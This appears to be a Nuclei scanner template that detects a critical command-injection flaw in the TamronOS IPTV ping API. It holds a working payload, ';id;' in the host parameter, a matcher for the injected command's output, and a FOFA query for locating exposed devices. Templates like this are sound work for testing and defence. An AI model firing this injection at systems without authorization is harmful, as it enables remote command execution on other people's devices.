id: tamronos-rce

info:
  name: TamronOS IPTV System Ping - Arbitrary Command Execution
  author: DhiyaneshDk
  severity: critical
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/TamronOS%20IPTV%E7%B3%BB%E7%BB%9F%20ping%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="TamronOS-IPTV系统"
  tags: tamronos,miconfig

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/ping?count=1&host=;id;"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)'

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
